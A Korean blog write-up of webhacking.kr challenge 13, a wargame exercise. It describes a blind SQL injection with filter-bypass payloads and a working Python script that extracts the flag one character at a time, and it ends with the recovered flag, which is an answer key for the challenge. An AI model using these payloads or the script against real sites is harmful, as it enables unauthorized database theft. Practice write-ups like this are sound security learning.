---
layout: post
title: ! "[Webhacking.kr] 13"
categories: [Webhacking.kr]
excerpt: " "
comments: true
share: true
tags:
  - Web-hacking
  - webhacking.kr
  - write-up
---

webhacking.kr의 최고점(1000) 문제인 13번을 풀어보도록 하겠습니다.

![]({{ site.baseurl }}/assets/posts/webhackingkr/13.png)

13번 문제는 친절하게도 HINT가 있다. `select flag from prob13password` 로, 컬럼명과 테이블명을 알려준다.
당연하게도 그대로 입력하면 `no hack`이 뜬다!

![]({{ site.baseurl }}/assets/posts/webhackingkr/13_1.png)

1을 입력했을 경우, result : 1 과 같이 테이블처럼 보이는 것이 뜬다.

![]({{ site.baseurl }}/assets/posts/webhackingkr/13_13.png)

확인 결과 출력되는 것은 result : 1, result : 0, no hack 세 개뿐인 것 같다.
왠지 결과값의 True or False로 확인하는 Blind SQL Injection의 냄새가 난다 ㅎㅎ

flag 컬럼의 row 수를 구하기 위해 아래와 같은 쿼리를 입력한다.

`?no=if((select(count(flag))from(prob13password))in(숫자),1,2)`

prob13password 테이블의 flag 컬럼의 row 수가 in 안의 숫자와 일치하면 no=1, 아니면 no=2가 된다.

![]({{ site.baseurl }}/assets/posts/webhackingkr/13_count1.png)
![]({{ site.baseurl }}/assets/posts/webhackingkr/13_count2.png)

다른 숫자도 넣어봤을 때 no=2일 때만 result가 참이었으므로 flag 컬럼의 row는 2개인 것을 확인할 수 있다.
데이터가 많지 않으므로 SQL의 min,max 함수를 사용해 데이터들의 최소, 최대 길이를 구할 것이다.
SQL 공부도 할겸 서버에서 직접 테스트 해봤다.

![]({{ site.baseurl }}/assets/posts/webhackingkr/13_minmax.png)

문제 풀이를 위해 기존에 쓰던 코드를 조금 변형해서 짰다.
```py
# -*- coding : UTF-8 -*-
from requests import get
import string
from time import sleep

url = "http://webhacking.kr/challenge/web/web-10/"
cookies = dict(PHPSESSID="1f70714d3b9c01e58b7a5c6c6c1a08f2")
special_strings = "~!@#$%^&*()+-_{}[]<>"
alpha = string.ascii_letters+string.digits+special_strings
result = ""

ascii_list = []
for i in range(21,126):
        ascii_list.append(chr(i))

for i in range(1,50):
    parameter = "?no=if((select(max(length(flag)))from(prob13password))in("+str(i)+"),1,2)"
    new_url = url + parameter
    r = get(new_url, cookies=cookies)

    if r.text.find("<tr><td>result</td></tr><tr><td>1</td></tr>") > 0:
        length = i + 1
        print("Max data length is "+str(i))
        break

for i in range(1, length):
        for a in string.printable:
                parameter = "?no=(substr((select%0amin(flag)%0afrom%0aprob13password)," + str(i) + ",1)in(" + hex(ord(a)) + "))"
                new_url = url + parameter
                r = get(new_url, cookies=cookies)

                if r.text.find("<td>1</td>") > 0:
                        print(str(i) + " -> "+a)
                        result += a
                        break

                if i == length-1:
                        print("\npassword is "+result)
                        print("\n")
```

max 데이터의 길이를 구하고, 길이를 구할 때 사용했던 쿼리를 조금 바꿔서  substr을 추가해주었다.
`(substr((select%0amin(flag)%0afrom%0aprob13password),1,1)in(0x66))`

이번 쿼리를 짜면서 헷갈리고 어려웠던 부분은 min과 hex의 사용이었다.
분명 Auth flag는 max 데이터일텐데 왜 select min(flag)를 하며, in(hex)를 사용하는가였다.
hex값과 똑같은 문자를 넣으면 거짓이 떴다.

다른 분들의 풀이를 참고해도 설명이 다 달라서 헷갈린다..ㅎㅎ 이 부분은 더 공부를 해봐야 할 것 같다.

위 코드는 결과값은 잘 나오는데 출력이 조금 이상해서 마지막 글자만 떨어져서 나온다.. 손 좀 봐야겠다.

![]({{ site.baseurl }}/assets/posts/webhackingkr/13_flag.png)

여기서 나온 `challenge13luckclear` 를 Auth 부분에 입력하면 문제가 풀린다.

![]({{ site.baseurl }}/assets/posts/webhackingkr/13_clear.png)


